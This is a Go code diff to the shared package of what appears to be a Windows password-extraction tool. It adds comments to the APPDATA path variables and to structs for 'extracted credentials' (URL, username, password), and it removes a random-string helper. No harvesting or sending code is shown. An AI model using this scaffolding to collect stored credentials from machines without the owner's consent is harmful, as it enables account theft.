@@ -2,28 +2,45 @@ package common
 
 import (
 	"io/ioutil"
-	"math/rand"
 	"os"
 	"syscall"
 	"unsafe"
 )
 
 var (
+	/*
+		Contain home directory of current user
+	 */
 	UserHome     = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+
+	/*
+		Contain path to %APPDATA% directory
+	 */
 	AppData      = os.Getenv("APPDATA")
+
+	/*
+		Contain path to %LOCALAPPDATA% directory
+	 */
 	LocalAppData = os.Getenv("LOCALAPPDATA")
 )
 
+/*
+	Main struct for extracted credentials that contains a target url, login and password
+ */
 type UrlNamePass struct {
 	Url      string
 	Username string
 	Pass     string
 }
 
+/*
+	Struct for extracted credentials that contains only a login and password
+ */
 type NamePass struct {
 	Name string
 	Pass string
 }
+
 
 type ExtractCredentialsResult struct {
 	Success bool
@@ -33,19 +50,6 @@ type ExtractCredentialsResult struct {
 type ExtractCredentialsNamePass struct {
 	Success bool
 	Data    []NamePass
-}
-
-const Fail = "fail"
-
-func RandStringRunes(n int) string {
-
-	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-
-	b := make([]rune, n)
-	for i := range b {
-		b[i] = letterRunes[rand.Intn(len(letterRunes))]
-	}
-	return string(b)
 }
 
 func RemoveDuplicates(elements []UrlNamePass) []UrlNamePass {
